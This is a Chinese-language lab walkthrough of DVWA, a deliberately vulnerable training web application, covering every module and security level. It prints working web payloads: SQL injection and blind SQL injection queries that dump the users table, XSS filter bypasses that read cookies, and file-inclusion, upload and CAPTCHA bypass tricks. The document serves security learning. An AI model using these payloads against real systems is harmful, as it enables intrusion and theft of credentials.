---
title: DVWA完整通关记录
tags:
  - ctf
  - misc
  - python
  - 文件上传漏洞
id: '446'
categories:
  - - ctf
  - - misc
  - - python
  - - SQL注入
  - - 文件上传漏洞
date: 2018-07-09 09:33:04
---

 

DVWA完整测评

# 1. 环境搭建

## 1.1. 系统环境：

使用MAMP集成包搭建Apache+MySql+PHP环境:

Apache: Apache/2.4.33 (Unix)

Mysql:5.6.38

PHP:5.6.32

## 1.2. 部署web系统：

官网下载dvwa压缩包，解压到web目录下，修改config.inc.php文件，配置数据库账户、密码和安全等级，安装dvwa。

# 2. Brute Force(暴力破解)

## 2.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.001.png)

使用burpsuit拦截观察：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.002.png)

### 2.1.1. 思路1：

该功能直接使用get方式传值登录，没有设置校验码，唯一token等校验方式，可以直接使用burpsuit的intruder模块进行暴力破解。截图如下。

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.003.png)

设置抓取成功登录时的Welcome字段，作为标记密码是否正确，也可以用返回包长度做判断。

### 2.1.2. 思路2：

查看过源代码后，除了md5进行了加密，没有进行任何过滤，故可以使用sql注入绕过，如下图：**username:admin’--%20**

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.004.png)

## 2.2. 安全等级：MEDIUM

相比LOW等级，MEDIUM加入了**mysqli\_real\_escape\_string()**函数，防止sql注入。密码输入错误时加入了sleep(2)延迟返回时间，降低爆破效率及准确度。

### 2.2.1. 思路1：

可以使用Python脚本实现暴力破解，控制超时时间，提高爆破效率。

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.005.png)

## 2.3. 安全等级：HIGH

依然通过抓包分析，表单设置有掩藏token，提交的时候需要提交有效的token。

### 2.3.1. 思路1：

爆破方法：每次进入登录页面，服务器会返回一个随机的user\_token隐藏域，随表单一起提交上去。服务器校验token是否有效，如果无效，执行302跳转，若是有效，执行登录功能。只需要在中级安全等级的脚本功能上稍作改动就可以实现爆破，在每次发送登录请求前，先去获取一个新的token值，随登录请求一起提交即可绕过token验证。

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.006.png)

## 2.4. 安全等级：impossible

同样的一波抓包，这个安全度的登录改为使用POST方法，加隐藏token域，但使用脚本只需要改改发送方法即可绕过。但是密码会被锁定15分钟，漏洞无法利用。如图：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.007.png)

# 3. Command Injection(命令注入)

## 3.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.008.png)

使用burpsuit拦截观察：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.009.png)

### 3.1.1. 思路1：

该功能直接将用户输入值不加过滤的放入cmd或shell中执行，所以可以远程执行任意命令。截图如下：

系统执行完ping命令后执行了pwd命令并输出

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.010.png)

## 3.2. 安全等级：MEDIUM

### 3.2.1. 思路1：

相比LOW等级，MEDIUM等级替换掉了&&和”;”符号，可以时候符号，故意将ip字段填错即可，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.011.png)

## 3.3. 安全等级：HIGH

完善了黑名单，但仍然存在漏网之鱼

### 3.3.1. 思路1：

过滤了” ”但是可以使用管道执行后面的命令，如图；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.012.png)

## 3.4. 安全等级：impossible

同样的一波抓包，表单加了隐藏token。后台代码按ipv4地址手动重排，无法注入。如图：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.013.png)

# 4. Cross Site Request Forgery (CSRF) (跨站请求)

## 4.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.014.png)

使用burpsuit拦截观察：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.015.png)

### 4.1.1. 思路1：

该功能直接使用get方式传值登录，没有设置校验码，唯一token等校验方式，可以直接使用burpsuit生成CSRF POC代码，如图

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.016.png)

点击Test in browser复制地址，浏览器中打开，点击提交，成功更改密码。

## 4.2. 安全等级：MEDIUM

MEDIUM加入了校验Referer，不过是校验Referer中是否有$\_SERVER\[ 'SERVER\_NAME' \]的值，通过构造访问的url中包含关键词，即可绕过REFERER验证。

### 4.2.1. 思路1：

设置目录命名为localhost，绕过REFERER验证成功：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.017.png)

## 4.3. 安全等级：HIGH

依然通过抓包分析，表单设置有掩藏token，且提交时需要提交有效的token。

### 4.3.1. 思路1：

由于浏览器跨域请求问题，单一的CSRF攻击无法成功获取到token，需结合XSS攻击获取到token，再进行CSRF攻击。Xss页面植入代码如下：![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.018.png)

当访问xss页面时，会嵌入一个iframe 获取用户csrf页面的token，自动打开并传递给另一个网站，执行csrf攻击,拿到token

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.019.png)

攻击成功：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.020.png)

## 4.4. 安全等级：impossible

IMPOSSIBLE等级难度需要输入用户原密码，以及校验token。在不知道用户原密码的情况下无法发起CSRF攻击。![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.021.png)

# 5. File Inclusion (文件包含)

## 5.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.022.png)

使用page参数控制包含的文件名，由于没有任何过滤，可以包含任意文件（开启allow\_url\_influde和allow\_url\_fopen时可引入互联网文件。）

### 5.1.1. 思路1：

包含的脚本文件不需要验证后缀名，只需要有脚本代码在文本中就能够执行，可以使用图片马等,截图如下；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.023.png)

### 5.1.2. 思路2：

没有开启allow\_url\_include和allow\_url\_fopen时，若是有上传图片功能，可以利用图片马。或者发起一个get请求，包含要执行的命令，这个命令会被记录在access\_log文件里面，再将access\_log文件包含也会使代码执行。

## 5.2. 安全等级：MEDIUM

### 5.2.1. 思路1：

相比LOW等级，MEDIUM等级过滤了http和https协议，同时过滤了../和..\\。若是未开启allow\_url\_include和allow\_url\_fopen，可以使用 ….//绕过(或者使用绝对路径)，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.024.png)

## 5.3. 安全等级：HIGH

匹配传入的参数是否匹配文件名规则file\* 或者include.php

### 5.3.1. 思路1：

由于恰好可以利用file://协议，所以可以轻松包含本地文件如图；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.025.png)

## 5.4. 安全等级：impossible

设定了可包含的文件名白名单，无法利用文件包含漏洞。

# 6. File Upload (文件上传)

## 6.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.026.png)

### 6.1.1. 思路1：

上传的文件未做任何校验，可直接上传php马等,截图如下；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.027.png)

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.028.png)

## 6.2. 安全等级：MEDIUM

### 6.2.1. 思路1：

相比LOW等级，MEDIUM等级校验了Content-Type值，文件后缀名并没有校验或重命名。使用burpsuit拦截更改Content-Type绕过。截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.029.png)

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.030.png)

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.031.png)

### 6.2.2. 思路2：

这里可以使用文件包含漏洞，上传包含php代码的图片到服务器，使用文件包含漏洞执行恶意代码。

### 6.2.3. 思路3：

若是Magic\_quote\_gpc为off，则可以利用%00截断(burpsuit拦截修改)hack.php%00.png。

## 6.3. 安全等级：HIGH

后缀名使用查找最后一个小数点之后字符串的方法取出，再进行白名单校验。

### 6.3.1. 思路1：

但是没有对文件内容进行过滤审查，已然结合文件包含漏洞，成功实现文件上传漏洞攻击，截图如下：

上传一张正常图片，拦截并只修改文件内容为php代码。

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.032.png)

上传成功后结合文件包含漏洞,成功执行：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.033.png)

## 6.4. 安全等级：impossible

本级别对文件名进行重置,对图像进行重绘，去除php代码，无法利用。

# 7. Insecure CAPTCHA (不安全的验证机制)

## 7.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.034.png)

### 7.1.1. 思路1：

密码修改功能分为step1和step2,通过拦截数据包修改step参数，绕过验证码检查，截图如下；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.035.png)

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.036.png)

## 7.2. 安全等级：MEDIUM

### 7.2.1. 思路1：

相比LOW等级，MEDIUM等级仅仅添加了一个判断是否通过验证码打的参数passed\_captcha，只需要拦截请求包添加passed\_captcha参数和更改step参数为2。截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.037.png)

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.038.png)

## 7.3. 安全等级：HIGH

### 7.3.1. 思路1：

不再采用分步重置密码，当即校验验证码是否正确，但是判断变量可以从从伪造参数g-recaptcha-response和user\-agent绕过验证，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.039.png)

## 7.4. 安全等级：impossible

本级别将验证码验证放在同一个步骤中，验证机制没有例外，数据库操作参数使用pdo执行，更改密码前需要输入原密码。无法绕过验证码。

# 8. SQL Injection (SQL注入)

## 8.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.040.png)

### 8.1.1. 思路1：

1.  判断是否存在注入，注入是字符型还是数字型

a) 使用1’测试报错显示是字符型

2.  猜解SQL查询语句中的字段数

a) 使用1' order by n—判断出列数为2

3.  确定显示的字段顺序

a) 使用union select 1,2 – 判断能显示的字段

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.041.png)

4.  获取当前数据库

a) 使用1' union select @@version,database()—

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.042.png)

5.  获取数据库中的表

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.043.png)

6.  获取表中的字段名

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.044.png)

7.  下载数据

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.045.png)

## 8.2. 安全等级：MEDIUM

### 8.2.1. 思路1：

相比LOW等级，MEDIUM等级将前端输入变成选择id，使用burp即可无视前端防护，后台代码使用了mysqli\_real\_escape\_string函数，但是这里是数字型，并不能防护。截图如下：

1.  判断是否存在注入，注入是字符型还是数字型

a) 使用1 or 1=1测试报错显示是数字型

2.  猜解SQL查询语句中的字段数

a) 使用1 order by n—判断出列数为2

3.  确定显示的字段顺序

a) 使用union select 1,2 – 判断能显示的字段

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.046.png)

4.  获取当前数据库

a) 使用1 union select @@version,database()

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.047.png)

5.  获取数据库中的表

a) 1 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.048.png)

6.  获取表中的字段名

a) 1 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name=0x7573657273

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.049.png)

7.  下载数据

a) 1 union select group\_concat(user),group\_concat(password) from users

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.050.png)

## 8.3. 安全等级：HIGH

### 8.3.1. 思路1：

新的界面形同虚设，后台的limit 1 注释即可，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.051.png)

## 8.4. 安全等级：impossible

参数使用pdo绑定查询，且加入csrf防御，并判断结果是否为1，防止脱裤。

# 9. SQL Injection (Blind)(SQL盲注)

## 9.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.052.png)

### 9.1.1. 思路1：

使用基于bool的注入

1.  判断是否存在注入，注入是字符型还是数字型

a) 使用1'and'1'='1返回正确结果

b) 使用1'and'1'='2 返回错误结果

c) 判断为字符型注入

2.  获取当前数据库

a) 使用1' and length(database())>n— 判断出当前数据库名长度为4

b) 使用1’ and ascii(substr(database(),1,1))=n\-- 可以判断出第一位为d（或者使用二分法查询）

c) 依次判断出当前数据库名。dvwa

3.  获取数据库中的表

a) 首先使用1’ and (select count(table\_name) from information\_schema.tables where table\_schema=database())=n\-- 判断出有两个数据表

b) 然后判断第一个数据表名的长度，使用1' and (SELECT (select length(table\_name) from information\_schema.tables where table\_schema=database() limit 1,1))=n—

c) 判断第一个数据表表名：1' and ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 1,1),1,1))=n \--

d) 按这个方法，可以猜测出两个数据表 guestbook, users

4.  获取表中的字段名

a) 首先使用1' and (select count(column\_name) from information\_schema.columns where table\_name='users' and TABLE\_SCHEMA = 'dvwa')=n\-- 判断出有8个字段

b) 然后判断第一个字段名的长度，使用1' and (SELECT (select length(column\_name) from information\_schema.columns where table\_schema=’dvwa’ and table\_name=’users’ limit 1,1))=n—

c) 判断第一个数据表表名：1' and ascii(substr((select column\_name from information\_schema.columns where table\_schema=’dvwa’ and table\_name=’users’ limit 1,1),1,1))=n --

d) 按这个方法，可以猜测出列名。

5.  下载数据

a) 判断数据表行数:1' and (select count(\*) from users)=n\--

b) 判断user列第一行数据长度：1' and (select(select length(user) from users limit 1,1))\=n\--

c) 判断user字段第一个数据: 1' and ascii(substr((select user from users limit 1,1),1,1))=n --

d) 如此可以获取任何数据

### 9.1.2. 思路2:

使用基于时间的注入，使用if(条件,seleep(4),1)

1.  判断是否存在注入，注入是字符型还是数字型

a) 使用1'and sleep(5) -- 感到延迟

b) 使用1 and sleep(5)-- 没有延迟

c) 判断为字符型注入

2.  获取当前数据库

a) 使用1' and if(length(database())>n,sleep(3),1)— 判断出当前数据库名长度为4

b) 使用1’ and if(ascii(substr(database(),1,1))=n,sleep(3),1)\-\- 可以判断出第一位为d（或者使用二分法查询）

c) 依次判断出当前数据库名。dvwa

3.  获取数据库中的表

a) 首先使用1’ and if((select count(table\_name) from information\_schema.tables where table\_schema=database())=n,sleep(3),1)\-- 判断出有两个数据表

b) 然后判断第一个数据表名的长度，使用1' and if((SELECT (select length(table\_name) from information\_schema.tables where table\_schema=database() limit 1,1))=n,sleep(3),1)—

c) 判断第一个数据表表名：1' and if(ascii(substr((select table\_name from information\_schema.tables where table\_schema=database() limit 1,1),1,1))=n,sleep(3),1) --

d) 按这个方法，可以猜测出两个数据表 guestbook, users

4.  获取表中的字段名

a) 首先使用1' and if((select count(column\_name) from information\_schema.columns where table\_name='users' and TABLE\_SCHEMA = 'dvwa')=n,sleep(3),1)\-- 判断出有8个字段

b) 然后判断第一个字段名的长度，使用1' and if((SELECT (select length(column\_name) from information\_schema.columns where table\_schema=’dvwa’ and table\_name=’users’ limit 1,1))=n,sleep(3),1)—

c) 判断第一个数据表表名：1' and if(ascii(substr((select column\_name from information\_schema.columns where table\_schema=’dvwa’ and table\_name=’users’ limit 1,1),1,1))=n,sleep(3),1) --

d) 按这个方法，可以猜测出列名。

5.  下载数据

a) 判断数据表行数:1' and if((select count(\*) from users)=n,sleep(3),1)\--

b) 判断user列第一行数据长度：1' and if((select(select length(user) from users limit 1,1))\=n,sleep(3),1)\--

c) 判断user字段第一个数据: 1' and if(ascii(substr((select user from users limit 1,1),1,1))=n,sleep(3),1) --

d) 如此可以获取任何数据

## 9.2. 安全等级：MEDIUM

### 9.2.1. 思路1：

相比LOW等级，MEDIUM等级将前端输入变成选择id，使用burp即可无视前端防护，后台代码使用了mysqli\_real\_escape\_string函数，但是这里是数字型，并不能防护。基于bool和基于时间的方法利用payload与low等级相同，只需在burp中拦截并修改即可。

## 9.3. 安全等级：HIGH

### 9.3.1. 思路1：

使用cookie传参数，校验错误的时候随机产生时间延迟，Limit 1仍然可以被直接注释掉。因此这里仍然可以使用基于bool的盲注。过程省略：

## 9.4. 安全等级：impossible

参数使用pdo绑定查询，且加入csrf防御，并判断结果是否为1，防止脱裤。

# 10. Weak Session IDs (弱session口令)

## 10.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.053.png)

### 10.1.1. 思路1：

很容易看出dvwaSession是递增产生的，所以攻击者只需要从0开始向上尝试，即可伪造session口令。截图如下（这里好像并没作用，只是个代码审计）；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.054.png)

## 10.2. 安全等级：MEDIUM

### 10.2.1. 思路1：

Session机制采用基于时间戳生成，只要知道用户A登录大致时间，就可以推测出A的session，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.055.png)

## 10.3. 安全等级：HIGH

### 10.3.1. 思路1：

仍然采用累加的方式，只不过就行了进一步的md5操作，基于大量的session值可以分析出来，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.056.png)

## 10.4. 安全等级：impossible

使用随机数+时间戳+固定字符串进行md5生成作为session，很难被猜测到。

# 11. XSS DOM (基于dom的xss攻击)

## 11.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.057.png)

### 11.1.1. 思路1：

抓包分析一下，传入default参数，前端代码设置为动态生成选项值，且没有任何防护，截图如下；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.058.png)

故可以直接利用payload : 
```
default=<script>alert(document.cookie)</script>
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.059.png)

## 11.2. 安全等级：MEDIUM

### 11.2.1. 思路1：

相比LOW等级，MEDIUM等级对<script进行了检测，如果含有该字符串，default参数就会被重置。服务端检测的参数和前端取用的值不对应，成功绕过检测， payload：
```
?default=2342&default2=<script>alert(document.cookie)</script>
```
截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.060.png)

## 11.3. 安全等级：HIGH

### 11.3.1. 思路1：

可用medium中的payload方法绕过，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.061.png)

## 11.4. 安全等级：impossible

由前端防护

# 12. XSS Reflected (基于反射型的xss攻击)

## 12.1. `安全等级`：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.062.png)

### 12.1.1. 思路1：

抓包分析一下，传入name参数，后台直接接受并返回；

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.063.png)

故可以直接利用payload : 

```
?name=<script>alert(document.cookie)</script>
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.064.png)

## 12.2. 安全等级：MEDIUM

### 12.2.1. 思路1：

相比LOW等级，MEDIUM等级对<script\>进行了过滤，可以使用双写绕过payload：

```
?name=<scr<script>ipt>alert(document.cookie)</ script>)
```

截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.065.png)

### 12.2.2. 思路2：

使用dom型运行js脚本， payload：
```
<img src=x onerror=javascript:alert(document.cookie)>截图如下：
```

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.066.png)

### 12.2.3. 思路3：

大小写变换绕过， payload：
```
<ScripT>alert()</script>
```

截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.067.png)

## 12.3. 安全等级：HIGH

### 12.3.1. 思路1：

匹配规则无法使用双写绕过，无法使用大小写绕过，但仍然可以使用`<img src=x  onerror=alert(document.cookie)\>`绕过，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.068.png)

## 12.4. 安全等级：impossible

Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、\>转换为 HTML 实体，防止浏览器将其作为HTML元素。

# 13. XSS Stored(基于存储型的xss攻击)

## 13.1. 安全等级：LOW

功能演示：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.069.png)

### 13.1.1. 思路1：

抓包分析一下，使用POST方法提交name和message的值，后台进行去除转义反斜杠、特殊字符和两端空格，并未对xss防御；故可以直接利用

payload : `<script>alert(document.cookie)</script>`

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.070.png)

## 13.2. 安全等级：MEDIUM

### 13.2.1. 思路1：

相比LOW等级，MEDIUM等级对message进行了严格的过滤转义，但是对name参数只对<script\>进行了过滤，可以使用双写绕过，对name长度的限制可以在burpsuit中绕过。

payload： `<scr<script>ipt>alert(document.cookie)</ script>)`

截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.071.png)

### 13.2.2. 思路2：

使用dom型运行js脚本， payload：
```
<img src=x onerror=javascript:alert(document.cookie)>
```
截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.072.png)

### 13.2.3. 思路3：

大小写变换绕过， payload：`<ScripT>alert()</script>`

截图如下：![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.073.png)

## 13.3. 安全等级：HIGH

### 13.3.1. 思路1：

Message参数仍然严格过滤，Name参数匹配规则无法使用双写绕过，无法使用大小写绕过，但name仍然可以使用`<img src=x  onerror=alert(document.cookie)\>`绕过，截图如下：

![](https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2018/07/6fcdf7a2-99df-4fbc-8158-77a7f6457e34.074.png)

## 13.4. 安全等级：impossible

Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、\>转换为 HTML 实体，防止浏览器将其作为HTML元素()该处无法利用。